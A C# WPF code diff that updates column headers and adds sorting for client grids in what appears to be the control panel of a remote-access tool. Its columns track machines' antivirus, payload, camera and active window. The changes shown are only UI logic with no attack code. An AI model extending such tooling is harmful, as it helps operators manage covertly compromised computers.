@@ -8256,7 +8256,6 @@ Read-Host 'Press Enter to close'
         UpdateColHeader(GridClients, "MACHINE",  Lang.Get("COL_MACHINE"));
         UpdateColHeader(GridClients, "OS",       Lang.Get("COL_OS"));
         UpdateColHeader(GridClients, "AV",       Lang.Get("COL_AV"));
-        UpdateColHeader(GridClients, "PAYLOAD",  Lang.Get("COL_PAYLOAD"));
         UpdateColHeader(GridClients, "1ST SEEN", Lang.Get("COL_1STSEEN"));
         UpdateColHeader(GridClients, "CPU",      Lang.Get("COL_CPU"));
         UpdateColHeader(GridClients, "GPU",      Lang.Get("COL_GPU"));
@@ -8264,7 +8263,7 @@ Read-Host 'Press Enter to close'
         if (ColCamHdr    != null) ColCamHdr.Header    = Lang.Get("COL_CAM");
         UpdateColHeader(GridClients, "WINDOW",   Lang.Get("COL_WINDOW"));
         if (ColStatusHdr != null) ColStatusHdr.Header = Lang.Get("COL_STATUS");
-        if (ColLoadHdr   != null) ColLoadHdr.Header   = Lang.Get("COL_PAYLOAD");
+        UpdateColHeader(GridClients, "LOAD", Lang.Get("COL_LOAD"));
         foreach (var c in _onlineClients) c.NotifyStatus();
         UpdateColHeader(GridClients, "PING",     Lang.Get("COL_PING"));
         UpdateColHeader(GridClients, "TAG",      Lang.Get("COL_TAG"));
@@ -8281,7 +8280,6 @@ Read-Host 'Press Enter to close'
             UpdateColHeader(GridAllClients, "AV",         Lang.Get("COL_AV"));
             UpdateColHeader(GridAllClients, "CPU",        Lang.Get("COL_CPU"));
             UpdateColHeader(GridAllClients, "GPU",        Lang.Get("COL_GPU"));
-            UpdateColHeader(GridAllClients, "PAYLOAD",    Lang.Get("COL_PAYLOAD"));
             UpdateColHeader(GridAllClients, "RAM",        Lang.Get("COL_RAM"));
             UpdateColHeader(GridAllClients, "FIRST SEEN", Lang.Get("COL_FIRST_SEEN"));
             UpdateColHeader(GridAllClients, "LAST SEEN",  Lang.Get("COL_LAST_SEEN"));
@@ -9078,6 +9076,30 @@ Read-Host 'Press Enter to close'
         {
             view.SortDescriptions.Add(new System.ComponentModel.SortDescription(sortPath, direction));
         }
+    }
+
+    private void GridAllClients_Sorting(object sender, DataGridSortingEventArgs e)
+    {
+        e.Handled = true;
+        var column = e.Column;
+        var view = System.Windows.Data.CollectionViewSource.GetDefaultView(GridAllClients.ItemsSource);
+        if (view == null) return;
+
+        var direction = (column.SortDirection != System.ComponentModel.ListSortDirection.Ascending)
+            ? System.ComponentModel.ListSortDirection.Ascending
+            : System.ComponentModel.ListSortDirection.Descending;
+        column.SortDirection = direction;
+
+        view.SortDescriptions.Clear();
+        view.SortDescriptions.Add(new System.ComponentModel.SortDescription(
+            nameof(Data.ClientRecord.HasTag), System.ComponentModel.ListSortDirection.Descending));
+
+        string sortPath = column.SortMemberPath;
+        if (string.IsNullOrEmpty(sortPath) && column is DataGridBoundColumn boundCol && boundCol.Binding is System.Windows.Data.Binding binding)
+            sortPath = binding.Path.Path;
+
+        if (!string.IsNullOrEmpty(sortPath))
+            view.SortDescriptions.Add(new System.ComponentModel.SortDescription(sortPath, direction));
     }
 
     private void UpdateOpenWindowTitlesAndLabels(string clientId, string tag)
